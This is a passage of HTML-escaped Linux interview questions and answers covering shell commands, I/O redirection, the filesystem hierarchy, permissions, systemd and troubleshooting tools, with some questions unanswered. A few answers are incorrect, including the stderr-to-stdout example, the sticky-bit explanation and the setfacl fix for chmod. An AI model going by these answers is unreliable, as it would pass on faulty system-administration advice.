parent directory&lt;/li&gt; &lt;li&gt;cd . -&amp;gt; change to the directory you currently in&lt;/li&gt; &lt;li&gt;cd - -&amp;gt; change to the last visited path &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Some of the commands in the previous question can be run with the -r/-R flag. What does it do? Give an example to when you would use it&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;The -r (or -R in some commands) flag allows the user to run a certain command recursively. For example, listing all the files under the following tree is possible when done recursively (&lt;code&gt;ls -R&lt;/code&gt;):&lt;/p&gt; &lt;p&gt;/dir1/ dir2/ file1 file2 dir3/ file3&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;To list all the files, one can run &lt;code&gt;ls -R /dir1&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain each field in the output of `ls -l` command&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; It shows a detailed list of files in a long format. From the left: &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;file permissions, number of links, owner name, owner group, file size, timestamp of last modification and directory/file name &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are hidden files/directories? How to list them?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;These are files directly not displayed after performing a standard ls direct listing. An example of these files are .bashrc which are used to execute some scripts. Some also store configuration about services on your host like .KUBECONFIG. The command used to list them is, &lt;code&gt;ls -a&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What do &amp;gt; and &amp;lt; do in terms of input and output for programs?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; They take in input (&amp;lt;) and output for a given file (&amp;gt;) using stdin and stdout. &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;myProgram &amp;lt; input.txt &amp;gt; executionOutput.txt&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what each of the following commands does and give an example on how to use it: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;sed&lt;/li&gt; &#xA;   &lt;li&gt;grep&lt;/li&gt; &#xA;   &lt;li&gt;cut&lt;/li&gt; &#xA;   &lt;li&gt;awk&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;sed: a stream editor. Can be used for various purposes like replacing a word in a file: &lt;code&gt;sed -i s/salad/burger/g&lt;/code&gt;&lt;/li&gt; &lt;li&gt;grep: a search tool. Used to search, count or match a text in a file: &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;searching for any line that contains a word in a file: &lt;code&gt;grep &#39;word&#39; file.md&lt;/code&gt;&lt;/li&gt; &#xA;     &lt;li&gt;or displaying the total number of times a string appears in a file: &lt;code&gt;grep -c &#39;This is a string&#39; file.md&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;cut: a tool for cutting out selected portions of each line of a file: &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;syntax: &lt;code&gt;cut OPTION [FILE]&lt;/code&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;cutting first two bytes from a word in a file: &lt;code&gt;cut -b 1-2 file.md&lt;/code&gt;, output: &lt;code&gt;wo&lt;/code&gt; &lt;/li&gt;&#xA;      &lt;/ul&gt;&lt;/li&gt;&#xA;    &lt;/ul&gt;&lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;      &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to rename the name of a file or a directory?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Using the &lt;code&gt;mv&lt;/code&gt; command. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Specify which command would you use (and how) for each of the following scenarios &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Remove a directory with files&lt;/li&gt; &#xA;   &lt;li&gt;Display the content of a file&lt;/li&gt; &#xA;   &lt;li&gt;Provides access to the file /tmp/x for everyone&lt;/li&gt; &#xA;   &lt;li&gt;Change working directory to user home directory&lt;/li&gt; &#xA;   &lt;li&gt;Replace every occurrence of the word &#34;good&#34; with &#34;great&#34; in the file /tmp/y&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;&lt;code&gt;rm -rf dir&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;code&gt;cat or less&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;code&gt;chmod 777 /tmp/x&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;code&gt;cd ~&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;code&gt;sed -i s/good/great/g /tmp/y&lt;/code&gt; &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How can you check what is the path of a certain command?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;whereis&lt;/li&gt; &lt;li&gt;which &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between these two commands? Will it result in the same output? &lt;pre&gt;&lt;code&gt;echo hello world&#xA;echo &#34;hello world&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The echo command receives two separate arguments in the first execution and in the second execution it gets one argument which is the string &#34;hello world&#34;. The output will be the same. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain piping. How do you perform piping?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Using a pipe in Linux, allows you to send the output of one command to the input of another command. For example: &lt;code&gt;cat /etc/services | wc -l&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Fix the following commands: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;sed &#34;s/1/2/g&#39; /tmp/myFile&lt;/li&gt; &#xA;   &lt;li&gt;find . -iname *.yaml -exec sed -i &#34;s/1/2/g&#34; {} ;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;sed &#39;s/1/2/g&#39; /tmp/myFile  # sed &#34;s/1/2/g&#34; is also fine&#xA;find . -iname &#34;*.yaml&#34; -exec sed -i &#34;s/1/2/g&#34; {} \;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check which commands you executed in the past?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;history command or .bash_history file &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Running the command &lt;code&gt;df&lt;/code&gt; you get &#34;command not found&#34;. What could be wrong and how to fix it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt; &#xA; &lt;p&gt;&lt;b&gt; Most likely the default/generated $PATH was somehow modified or overridden thus not containing &lt;code&gt;/bin/&lt;/code&gt; where df would normally go. This issue could also happen if bash_profile or any configuration file of your interpreter was wrongly modified, causing erratics behaviours. You would solve this by fixing your $PATH variable: &lt;/b&gt;&lt;/p&gt;&#xA; &lt;p&gt;&lt;b&gt;As to fix it there are several options:&lt;/b&gt;&lt;/p&gt;&#xA; &lt;b&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;Manually adding what you need to your $PATH &lt;code&gt;PATH=&#34;$PATH&#34;:/user/bin:/..etc&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;You have your weird env variables backed up.&lt;/li&gt; &#xA;   &lt;li&gt;You would look for your distro default $PATH variable, copy paste using method #1&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Note: There are many ways of getting errors like this: if bash_profile or any configuration file of your interpreter was wrongly modified; causing erratics behaviours, permissions issues, bad compiled software (if you compiled it by yourself)... there is no answer that will be true 100% of the time. &lt;/b&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you schedule tasks periodically?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;You can use the commands &lt;code&gt;cron&lt;/code&gt; and &lt;code&gt;at&lt;/code&gt;. With cron, tasks are scheduled using the following format:&lt;/p&gt; &lt;p&gt;&lt;code&gt;*/30 * * * * bash myscript.sh&lt;/code&gt; Executes the script every 30 minutes.&lt;/p&gt; &lt;p&gt;&#xA;   &lt;minute&gt; &#xA;    &lt;hour&gt; &#xA;     &lt;day of month&gt; &#xA;      &lt;month&gt; &#xA;       &lt;day of week&gt; &#xA;        &lt;command to execute&gt;&#xA;       &lt;/day&gt;&#xA;      &lt;/month&gt;&#xA;     &lt;/day&gt;&#xA;    &lt;/hour&gt;&#xA;   &lt;/minute&gt;&lt;/p&gt; &lt;p&gt;The tasks are stored in a cron file, you can write in it using &lt;code&gt;crontab -e&lt;/code&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Alternatively if you are using a distro with systemd it&#39;s recommended to use systemd timers. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux - I/O Redirection&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Linux I/O redirection&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Demonstrate Linux output redirection&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;ls &amp;gt; ls_output.txt &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Demonstrate Linux stderr output redirection&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;yippiekaiyay 2&amp;gt; ls_output.txt &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Demonstrate Linux stderr to stdout redirection&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;yippiekaiyay 1&amp;gt;&amp;amp;2 &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of running the following command? &lt;code&gt;yippiekaiyay 1&amp;gt;&amp;amp;2 die_hard&lt;/code&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;An output similar to: &lt;code&gt;yippikaiyay: command not found...&lt;/code&gt;&lt;br&gt; The file &lt;code&gt;die_hard&lt;/code&gt; will not be created &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux FHS&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;In Linux FHS (Filesystem Hierarchy Standard) what is the &lt;code&gt;/&lt;/code&gt;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The root of the filesystem. The beginning of the tree. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is stored in each of the following paths? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;/bin, /sbin, /usr/bin and /usr/sbin&lt;/li&gt; &#xA;   &lt;li&gt;/etc&lt;/li&gt; &#xA;   &lt;li&gt;/home&lt;/li&gt; &#xA;   &lt;li&gt;/var&lt;/li&gt; &#xA;   &lt;li&gt;/tmp&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;binaries&lt;/li&gt; &lt;li&gt;configuration files&lt;/li&gt; &lt;li&gt;home directories of the different users&lt;/li&gt; &lt;li&gt;files that tend to change and be modified like logs&lt;/li&gt; &lt;li&gt;temporary files &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is special about the /tmp directory when compared to other directories?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;/tmp&lt;/code&gt; folder is cleaned automatically, usually upon reboot. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What kind of information one can find in /proc?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What makes /proc different from other filesystems?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? only root can create files in /proc&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False. No one can create file in /proc directly (certain operations can lead to files being created in /proc by the kernel). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What can be found in /proc/cmdline?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The command passed to the boot loader to run the kernel &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;In which path can you find the system devices (e.g. block storage)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Linux - Permissions&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to change the permissions of a file?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Using the &lt;code&gt;chmod&lt;/code&gt; command. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What does the following permissions mean?: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;777&lt;/li&gt; &#xA;   &lt;li&gt;644&lt;/li&gt; &#xA;   &lt;li&gt;750&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;pre&gt;&#xA;777 - You give the owner, group and other: Execute (1), Write (2) and Read (4); 4+2+1 = 7.&#xA;644 - Owner has Read (4), Write (2), 4+2 = 6; Group and Other have Read (4).&#xA;750 - Owner has x+r+w, Group has Read (4) and Execute (1); 4+1 = 5. Other have no permissions.&#xA;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What this command does? &lt;code&gt;chmod +x some_file&lt;/code&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; It adds execute permissions to all sets i.e user, group and others &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is setgid and setuid&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;setuid is a linux file permission that permits a user to run a file or program with the permissions of the owner of that file. This is possible by elevation of current user privileges.&lt;/li&gt; &lt;li&gt;setgid is a process when executed will run as the group that owns the file. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the purpose of sticky bit?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; Its a bit that only allows the owner or the root user to delete or modify the file. &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What the following commands do? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;chmod&lt;/li&gt; &#xA;   &lt;li&gt;chown&lt;/li&gt; &#xA;   &lt;li&gt;chgrp&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;chmod - changes access permissions to files system objects&lt;/li&gt; &lt;li&gt;chown - changes the owner of file system files and directories&lt;/li&gt; &lt;li&gt;chgrp - changes the group associated with a file system object &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is sudo? How do you set it up?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? In order to install packages on the system one must be the root user or use the sudo command&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;True &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what are ACLs. For what use cases would you recommend to use them?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You try to create a file but it fails. Name at least three different reason as to why it could happen&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;No more disk space&lt;/li&gt; &lt;li&gt;No more inodes&lt;/li&gt; &lt;li&gt;No permissions &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;A user accidentally executed the following &lt;code&gt;chmod -x $(which chmod)&lt;/code&gt;. How to fix it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Using &lt;code&gt;sudo setfacl -m u::rx /usr/bin/chmod&lt;/code&gt; will set the execute permissions on &lt;code&gt;chmod&lt;/code&gt; for all the users. Post this, the &lt;code&gt;chmod&lt;/code&gt; binary can be used as usual. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux - systemd&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is systemd?&lt;/summary&gt;&#xA; &lt;br&gt; &#xA; &lt;b&gt; Systemd is a daemon (System &#39;d&#39;, d stands for daemon). &lt;p&gt;A daemon is a program that runs in the background without direct control of the user, although the user can at any time talk to the daemon.&lt;/p&gt; &lt;p&gt;systemd has many features such as user processes control/tracking, snapshot support, inhibitor locks..&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;If we visualize the unix/linux system in layers, systemd would fall directly after the linux kernel.&lt;br&gt; Hardware -&amp;gt; Kernel -&amp;gt; &lt;u&gt;Daemons&lt;/u&gt;, System Libraries, Server Display. &lt;/b&gt;&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to start or stop a service?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;To start a service: &lt;code&gt;systemctl start &amp;lt;service name&amp;gt;&lt;/code&gt; To stop a service: &lt;code&gt;systemctl stop &amp;lt;service name&amp;gt;&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check the status of a service?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;systemctl status &amp;lt;service name&amp;gt;&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;On a system which uses systemd, how would you display the logs?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;journalctl&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe how to make a certain process/app a service&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h5&gt;Linux - Troubleshooting &amp;amp; Debugging&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Where system logs are located?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;/var/log &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to follow file&#39;s content as it being appended without opening the file every time?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;tail -f &amp;lt;file_name&amp;gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are you using for troubleshooting and debugging &lt;b&gt;network&lt;/b&gt; issues?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;dstat -t&lt;/code&gt; is great for identifying network and disk issues. &lt;code&gt;netstat -tnlaup&lt;/code&gt; can be used to see which processes are running on which ports. &lt;code&gt;lsof -i -P&lt;/code&gt; can be used for the same purpose as netstat. &lt;code&gt;ngrep -d any metafilter&lt;/code&gt; for matching regex against payloads of packets. &lt;code&gt;tcpdump&lt;/code&gt; for capturing packets &lt;code&gt;wireshark&lt;/code&gt; same concept as tcpdump but with GUI (optional). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are you using for troubleshooting and debugging &lt;b&gt;disk &amp;amp; file system&lt;/b&gt; issues?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;dstat -t&lt;/code&gt; is great for identifying network and disk issues. &lt;code&gt;opensnoop&lt;/code&gt; can be used to see which files are being opened on the system (in real time). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are you using for troubleshooting and debugging &lt;b&gt;process&lt;/b&gt; issues?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;strace&lt;/code&gt; is great for understanding what your program does. It prints every system call your program executed. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are you using for debugging CPU related issues?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;top&lt;/code&gt; will show you how much CPU percentage each process consumes &lt;code&gt;perf&lt;/code&gt; is a great choice for sampling profiler and in general, figuring out what your CPU cycles are &#34;wasted&#34; on &lt;code&gt;flamegraphs&lt;/code&gt; is great for CPU consumption visualization (&lt;a href=&#34;http://www.brendangregg.com/flamegraphs.html&#34;&gt;http://www.brendangregg.com/flamegraphs.html&lt;/a&gt;) &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You get a call from someone claiming &#34;my system is SLOW&#34;. What do you do?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Check with &lt;code&gt;top&lt;/code&gt; for anything unusual&lt;/li&gt; &lt;li&gt;Run &lt;code&gt;dstat -t&lt;/code&gt; to check if it&#39;s related to disk or network.&lt;/li&gt; &lt;li&gt;Check if it&#39;s network related with &lt;code&gt;sar&lt;/code&gt;&lt;/li&gt; &lt;li&gt;Check I/O stats with &lt;code&gt;iostat&lt;/code&gt; &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain iostat output&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to debug binaries?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between CPU load and utilization?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How you measure time execution of a program?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Linux - Kernel&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a kernel, and what does it do?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;The kernel is part of the operating system and is responsible for tasks like:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  